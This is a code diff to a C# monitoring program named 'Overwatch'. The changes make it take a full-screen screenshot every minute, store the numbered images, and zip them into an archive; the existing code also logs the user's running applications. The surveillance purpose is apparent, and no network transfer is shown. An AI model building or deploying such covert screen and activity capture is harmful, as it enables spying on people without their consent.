@@ -6,6 +6,8 @@ using System.Diagnostics;
 using System.Text.RegularExpressions;
 using System.Collections.Generic;
 using System.DirectoryServices;
+using System.IO.Compression;
+using System.IO;
 
 namespace Overwatch
 {
@@ -14,7 +16,9 @@ namespace Overwatch
         public Graphics graph = null;
         public Bitmap bmp= new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
         static appLog Log = new appLog();
-1
+        public int CountImage = 0;
+        private static string subPath = "\\ImagesPath";
+
         static public string UsersName;
         public static void CreateAndUpdateDate(string text, string WayAndName) { System.IO.File.AppendAllText(WayAndName, text); }
         public static List<string> GetComputerUsers()
@@ -38,15 +42,22 @@ namespace Overwatch
             {
                 while (true)
                 {
+                    if (!Directory.Exists(appConfing.targetDirPath + subPath))
+                        Directory.CreateDirectory(appConfing.targetDirPath + subPath);
                     graph = Graphics.FromImage(bmp);
                     graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
-                    bmp.Save(appConfing.targetDirPath + "\\Image.bmp");
+                    bmp.Save(appConfing.targetDirPath+subPath + String.Format("\\Image{0}.bmp", CountImage.ToString()));
+                    CountImage++;
                     System.Threading.Thread.Sleep(60000);
                 }
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
         }
-        
+        public static void CompressionFile()
+        {
+            string zipPath = @".\result.zip";
+            ZipFile.CreateFromDirectory(appConfing.targetDirPath+subPath, zipPath);
+        }
         private static List<string> GeneralProcess()
         {
             Process[] procList = Process.GetProcesses();
@@ -66,7 +77,7 @@ namespace Overwatch
             string name = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
             Process.GetProcesses().Where(p => new Regex(UsersName).IsMatch(p.MainWindowTitle)).ToList().ForEach(p => CreateAndUpdateDate(p.ProcessName + " ", appConfing.targetDirPath + "\\UsersApplication.txt"));
         }
-    
+        
         public void Overview() {
             while (true)
             {
